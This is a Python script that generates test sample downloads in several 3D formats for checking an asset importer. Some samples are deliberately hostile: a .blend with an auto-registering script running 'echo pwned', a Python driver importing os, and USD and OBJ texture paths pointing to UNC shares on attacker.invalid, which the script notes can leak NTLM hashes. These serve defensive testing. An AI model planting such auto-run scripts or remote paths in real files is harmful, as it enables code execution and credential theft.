# SPDX-FileCopyrightText: 2026 Hyperbond Studio Pte. Ltd.
# SPDX-License-Identifier: GPL-2.0-or-later
"""Write one Fab-shaped download per format with Blender's own exporters. Runs in a background Angelo.

``Angelo -b --factory-startup --python fab_formats_samples.py -- <folder>`` writes ``samples.json`` (path, format,
title per sample) and the files, the way Fab ships them (2026-11-11 observations): an FBX zip with its maps loose
beside it and no texture in its material (Megascans), an OBJ zip with .mtl and texture, a glTF zip with .bin and a
textures/ folder, a bare USD layer, two texture-set zips (four PNG maps in full words for the library, and seven
channels in abbreviated names, JPEG and PNG, applied to the selected mesh), and a .blend that carries
what must never reach the scene: a Text block, a Python driver beside a simple-expression driver, a camera, and a
texture whose path points outside the download.
"""

import json
import os
from pathlib import Path
import shutil
import sys
import zipfile

import bpy
import numpy as np

OUT = Path(sys.argv[sys.argv.index('--') + 1]).resolve()
SIDE = 64


def png(path, pixels):
    image = bpy.data.images.new(path.stem, SIDE, SIDE, alpha=True)
    image.pixels.foreach_set(np.ascontiguousarray(pixels, dtype=np.float32).ravel())
    image.filepath_raw = str(path)
    image.file_format = 'JPEG' if path.suffix.lower() in ('.jpg', '.jpeg') else 'PNG'
    image.save()
    return image


# A full texture set as scan libraries ship it: lower-case abbreviated names with a resolution suffix, colour and
# scalar maps as JPEG, the normal (OpenGL), height and cut-out masks as PNG. Each channel uses a different word
# than ``maps`` below, so the two sets cover two naming conventions.
CHANNELS = {'base_color': 'diff_1k.jpg', 'normal': 'nor_gl_1k.png', 'roughness': 'rough_1k.jpg',
            'metallic': 'metal_1k.jpg', 'ao': 'ao_1k.jpg', 'displacement': 'disp_1k.png', 'opacity': 'alpha_1k.png'}


def channel_maps(folder, prefix):
    """The seven ``CHANNELS`` maps, each with the content its channel has (a cut-out mask has holes, a metal map
    has bare-metal patches), so classifying them by their pixels agrees with their names."""
    folder.mkdir(parents=True, exist_ok=True)
    y, x = np.mgrid[0:SIDE, 0:SIDE] / SIDE
    height = 0.5 + 0.25 * np.sin(11 * x) * np.cos(5 * y) + 0.1 * np.sin(31 * x * y)
    dy, dx = np.gradient(height)
    normal = np.dstack([-dx * 8, -dy * 8, np.ones_like(height)])
    normal /= np.linalg.norm(normal, axis=2, keepdims=True)
    grey = lambda value: np.dstack([np.clip(value, 0, 1)] * 3 + [np.ones((SIDE, SIDE))])
    moss = np.clip((height - 0.55) * 4, 0, 1)
    colour = np.dstack([0.45 - 0.25 * moss, 0.42 + 0.1 * moss, 0.38 - 0.2 * moss, np.ones((SIDE, SIDE))])
    content = {'base_color': colour, 'normal': np.dstack([(normal + 1) / 2, np.ones((SIDE, SIDE))]),
               'roughness': grey(0.55 + 0.35 * moss), 'metallic': grey((np.sin(17 * x) * np.sin(13 * y) > 0.6) * 1.0),
               'ao': grey(0.35 + 0.65 * np.clip(height * 1.3, 0, 1)), 'displacement': grey(height),
               'opacity': grey((np.hypot(x - 0.5, y - 0.5) < 0.42) * 1.0)}
    for role, suffix in CHANNELS.items():
        png(folder / ('%s_%s' % (prefix, suffix)), content[role])


def maps(folder, prefix):
    folder.mkdir(parents=True, exist_ok=True)
    y, x = np.mgrid[0:SIDE, 0:SIDE] / SIDE
    height = 0.5 + 0.25 * np.sin(9 * x) * np.cos(7 * y)
    dy, dx = np.gradient(height)
    normal = np.dstack([-dx * 8, -dy * 8, np.ones_like(height)])
    normal /= np.linalg.norm(normal, axis=2, keepdims=True)
    rgba = lambda rgb: np.dstack([rgb, np.ones((SIDE, SIDE))])
    colour = rgba(np.dstack([0.55 + 0.2 * height, 0.35 + 0.1 * height, 0.2 * np.ones_like(height)]))
    files = {
        'BaseColor': png(folder / ('%s_BaseColor.png' % prefix), colour),
        'Normal': png(folder / ('%s_Normal.png' % prefix), rgba((normal + 1) / 2)),
        'Roughness': png(folder / ('%s_Roughness.png' % prefix), rgba(np.dstack([0.3 + 0.4 * height] * 3))),
        'Displacement': png(folder / ('%s_Displacement.png' % prefix), rgba(np.dstack([height] * 3))),
    }
    return files


def cube(name):
    """A fresh empty file with one cube and an untextured material."""
    bpy.ops.wm.read_factory_settings(use_empty=True)
    bpy.ops.mesh.primitive_cube_add(size=0.5, location=(0, 0, 0.25))
    obj = bpy.context.object
    obj.name = name
    material = bpy.data.materials.new(name + ' Material')
    material.use_nodes = True
    obj.data.materials.append(material)
    return obj


def texture(obj, image):
    tree = obj.data.materials[0].node_tree
    node = tree.nodes.new('ShaderNodeTexImage')
    node.image = image
    tree.links.new(node.outputs['Color'], tree.nodes['Principled BSDF'].inputs['Base Color'])


def zip_folder(folder, target):
    with zipfile.ZipFile(target, 'w', zipfile.ZIP_DEFLATED) as zipped:
        for path in sorted(folder.rglob('*')):
            if path.is_file():
                zipped.write(path, path.relative_to(folder).as_posix())
    shutil.rmtree(folder)
    return target


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    samples = []

    work = OUT / 'fbx'
    cube('Crate')   # Its material names no texture; the maps lie beside it.
    maps(work, 'Crate_Low_1K')
    bpy.ops.export_scene.fbx(filepath=str(work / 'Crate_Low.fbx'), use_selection=False)
    samples.append(dict(path=str(zip_folder(work, OUT / 'crate_fbx_low.zip')), format='fbx', title='Crate FBX'))

    work = OUT / 'obj'
    texture(cube('Stool'), maps(work, 'Stool')['BaseColor'])
    bpy.ops.wm.obj_export(filepath=str(work / 'Stool Pack.obj'), path_mode='RELATIVE')
    samples.append(dict(path=str(zip_folder(work, OUT / 'stool_obj.zip')), format='obj', title='Stool OBJ'))

    work = OUT / 'gltf'
    texture(cube('Lamp'), maps(work / 'textures', 'Lamp')['BaseColor'])
    bpy.ops.export_scene.gltf(filepath=str(work / 'Lamp.gltf'), export_format='GLTF_SEPARATE',
                              export_texture_dir='textures')
    for stale in (work / 'textures').glob('Lamp_*.png'):
        if stale.name != 'Lamp_BaseColor.png':
            stale.unlink()
    samples.append(dict(path=str(zip_folder(work, OUT / 'lamp_gltf.zip')), format='gltf', title='Lamp glTF'))

    cube('Vase')
    bpy.ops.wm.usd_export(filepath=str(OUT / 'vase.usdc'))
    samples.append(dict(path=str(OUT / 'vase.usdc'), format='usd', title='Vase USD'))

    work = OUT / 'surface'
    bpy.ops.wm.read_factory_settings(use_empty=True)
    maps(work, 'Painted_Plaster_xyz_1K')
    (work / 'readme.txt').write_text('Thanks for downloading.\n')
    samples.append(dict(path=str(zip_folder(work, OUT / 'plaster_1k.zip')), format='surface',
                        title='Painted Plaster', apply=False))

    work = OUT / 'surface_full'
    bpy.ops.wm.read_factory_settings(use_empty=True)
    channel_maps(work, 'mossy_rock')
    samples.append(dict(path=str(zip_folder(work, OUT / 'mossy_rock_1k.zip')), format='surface',
                        title='Mossy Rock', apply=True, channels=sorted(CHANNELS)))

    work = OUT / 'blend'
    work.mkdir()
    bench = cube('Bench')
    textures = maps(work / 'textures', 'Bench')
    texture(bench, textures['BaseColor'])
    textures['BaseColor'].filepath = '/nonexistent/author/disk/Bench_BaseColor.png'   # Relinked by name.
    text = bpy.data.texts.new('register_me.py')
    text.write('import os\nos.system("echo pwned")\n')
    text.use_module = True
    python = bench.driver_add('location', 0).driver
    python.type, python.expression = 'SCRIPTED', '__import__("os").getcwd() and 0'
    simple = bench.driver_add('location', 1).driver
    simple.type, simple.expression = 'SCRIPTED', 'frame * 0'
    bpy.ops.object.camera_add(location=(3, -3, 2))
    bpy.ops.object.light_add(type='SUN', location=(0, 0, 4))
    bpy.ops.wm.save_as_mainfile(filepath=str(work / 'bench.blend'), relative_remap=False)
    samples.append(dict(path=str(zip_folder(work, OUT / 'bench_blend.zip')), format='blend', title='Bench Blend'))

    # An FBX with its texture embedded that also records the author's absolute path, now gone (re-review r3 G4):
    # the bytes came from the download, so the texture must be kept.
    work = OUT / 'embed'
    texture(cube('Barrel'), maps(work, 'Barrel')['BaseColor'])
    bpy.ops.export_scene.fbx(filepath=str(OUT / 'barrel_embedded.fbx'), path_mode='COPY', embed_textures=True)
    shutil.rmtree(work)
    # Many exporters record only the absolute path: hide the relative one (same length, so the file stays valid).
    data = (OUT / 'barrel_embedded.fbx').read_bytes()
    assert b'RelativeFilename' in data
    (OUT / 'barrel_embedded.fbx').write_bytes(data.replace(b'RelativeFilename', b'RelativeFilenamX'))
    samples.append(dict(path=str(OUT / 'barrel_embedded.fbx'), format='fbx', title='Barrel embedded FBX',
                        embedded=True))

    # A .blend whose texture is packed in it but records the author's absolute path (same class as the FBX above).
    work = OUT / 'packed'
    crate = cube('Packed Crate')
    image = maps(work, 'PackedCrate')['BaseColor']
    texture(crate, image)
    image.pack()
    image.filepath_raw = '/nonexistent/author/disk/PackedCrate_BaseColor.png'
    shutil.rmtree(work)
    bpy.ops.wm.save_as_mainfile(filepath=str(OUT / 'packed_crate.blend'), relative_remap=False)
    samples.append(dict(path=str(OUT / 'packed_crate.blend'), format='blend', title='Packed crate .blend',
                        embedded=True))

    # UDIM sets (re-review r5): a .blend whose tiled texture names the author's vanished folder (relinked by name),
    # and a USD whose tiled texture sits beside it.
    y, x = np.mgrid[0:SIDE, 0:SIDE] / SIDE
    shade = lambda r, g, b: np.dstack([np.full((SIDE, SIDE), r), np.full((SIDE, SIDE), g) * (0.8 + 0.2 * x),
                                       np.full((SIDE, SIDE), b), np.ones((SIDE, SIDE))])
    work = OUT / 'udim_blend'
    wall = cube('UDIM Wall')
    (work / 'textures').mkdir(parents=True)
    png(work / 'textures' / 'Wall.1001.png', shade(0.7, 0.3, 0.2))
    png(work / 'textures' / 'Wall.1002.png', shade(0.2, 0.4, 0.7))
    tiled = bpy.data.images.load(str(work / 'textures' / 'Wall.1001.png'))
    tiled.source = 'TILED'
    tiled.filepath = str(work / 'textures' / 'Wall.<UDIM>.png')
    tiled.tiles.new(tile_number=1002)
    texture(wall, tiled)
    bpy.ops.wm.save_as_mainfile(filepath=str(work / 'wall.blend'), relative_remap=False)
    # The same set packed, plus a tile with no data (added and never saved): only that tile is trimmed.
    tiled.pack()
    tiled.tiles.new(tile_number=1003)
    bpy.ops.wm.save_as_mainfile(filepath=str(OUT / 'udim_partly_packed.blend'), relative_remap=False)
    samples.append(dict(path=str(OUT / 'udim_partly_packed.blend'), format='blend', title='UDIM partly packed .blend',
                        udim=True, trimmed=1))
    samples.append(dict(path=str(zip_folder(work, OUT / 'udim_wall_blend.zip')), format='blend',
                        title='UDIM wall .blend', udim=True))
    work = OUT / 'udim_usd'
    (work / 'textures').mkdir(parents=True)
    png(work / 'textures' / 'Tile.1001.png', shade(0.6, 0.6, 0.2))
    png(work / 'textures' / 'Tile.1002.png', shade(0.3, 0.6, 0.3))
    (work / 'tile.usda').write_text(
        '#usda 1.0\ndef Mesh "Tile" (prepend apiSchemas = ["MaterialBindingAPI"]) {\n'
        '  point3f[] points = [(0,0,0), (2,0,0), (2,1,0), (0,1,0)]\n  int[] faceVertexCounts = [4]\n'
        '  int[] faceVertexIndices = [0, 1, 2, 3]\n'
        '  texCoord2f[] primvars:st = [(0,0), (2,0), (2,1), (0,1)] (interpolation = "faceVarying")\n'
        '  rel material:binding = </Looks/Mat>\n}\n'
        'def Scope "Looks" {\n def Material "Mat" {\n  token outputs:surface.connect = </Looks/Mat/PBR.outputs:surface>\n'
        '  def Shader "PBR" {\n   uniform token info:id = "UsdPreviewSurface"\n'
        '   color3f inputs:diffuseColor.connect = </Looks/Mat/Tex.outputs:rgb>\n   token outputs:surface\n  }\n'
        '  def Shader "Tex" {\n   uniform token info:id = "UsdUVTexture"\n'
        '   asset inputs:file = @./textures/Tile.<UDIM>.png@\n   float3 outputs:rgb\n  }\n }\n}\n')
    samples.append(dict(path=str(zip_folder(work, OUT / 'udim_tile_usd.zip')), format='usd',
                        title='UDIM tile USD', udim=True))

    # A multiview (stereo) texture packed with both views (re-review r5): kept as one plain view.
    work = OUT / 'multiview'
    work.mkdir()
    screen = cube('Stereo Screen')
    png(work / 'tex_L.png', shade(0.8, 0.2, 0.2))
    png(work / 'tex_R.png', shade(0.2, 0.2, 0.8))
    bpy.context.scene.render.use_multiview = True
    bpy.context.scene.render.views_format = 'STEREO_3D'
    stereo = bpy.data.images.load(str(work / 'tex_L.png'))
    stereo.use_multiview = True
    stereo.views_format = 'INDIVIDUAL'
    stereo.alpha_mode = 'CHANNEL_PACKED'   # Kept by the single view (re-review r6 R3).
    stereo.pack()
    assert stereo.is_multiview and len(stereo.packed_files) == 2
    texture(screen, stereo)
    bpy.ops.wm.save_as_mainfile(filepath=str(OUT / 'stereo_screen.blend'), relative_remap=False)
    shutil.rmtree(work)
    samples.append(dict(path=str(OUT / 'stereo_screen.blend'), format='blend', title='Stereo screen .blend',
                        single_view=True))

    # A generated image that still holds packed bytes (packed, then Source set back to Generated; re-review r8):
    # it keeps its generated pattern and loses only the bytes.
    board = cube('Grid Board')
    grid = bpy.data.images.new('Grid', SIDE, SIDE, alpha=True)
    grid.pixels.foreach_set([0.5] * (SIDE * SIDE * 4))
    grid.pack()
    grid.source = 'GENERATED'
    grid.generated_type = 'COLOR_GRID'
    assert grid.source == 'GENERATED' and len(grid.packed_files) == 1
    texture(board, grid)
    bpy.ops.wm.save_as_mainfile(filepath=str(OUT / 'generated_grid.blend'), relative_remap=False)
    samples.append(dict(path=str(OUT / 'generated_grid.blend'), format='blend', title='Generated grid .blend',
                        generated_pattern=True))

    # Hostile: paths that name another computer (on Windows, opening one sends an NTLM hash). Must be refused unopened.
    (OUT / 'remote_texture.usda').write_text(
        '#usda 1.0\ndef Mesh "Cube" (prepend apiSchemas = ["MaterialBindingAPI"]) {\n'
        '  point3f[] points = [(0,0,0), (1,0,0), (0,1,0)]\n  int[] faceVertexCounts = [3]\n'
        '  int[] faceVertexIndices = [0, 1, 2]\n  rel material:binding = </Looks/Mat>\n}\n'
        'def Scope "Looks" {\n def Material "Mat" {\n  def Shader "Tex" {\n   uniform token info:id = "UsdUVTexture"\n'
        '   asset inputs:file = @//attacker.invalid/share/x.png@\n  }\n }\n}\n')
    samples.append(dict(path=str(OUT / 'remote_texture.usda'), format='usd', title='Remote texture USD', refused=True))
    work = OUT / 'remote_obj'
    work.mkdir()
    (work / 'chair.obj').write_text('mtllib chair.mtl\nv 0 0 0\nv 1 0 0\nv 0 1 0\nusemtl Wood\nf 1 2 3\n')
    (work / 'chair.mtl').write_text('newmtl Wood\nmap_Kd \\\\attacker.invalid\\share\\wood.png\n')
    samples.append(dict(path=str(zip_folder(work, OUT / 'remote_obj.zip')), format='obj', title='Remote texture OBJ',
                        refused=True))

    (OUT / 'samples.json').write_text(json.dumps(samples, indent=2))
    print('FAB_SAMPLES_WRITTEN', len(samples), flush=True)


main()
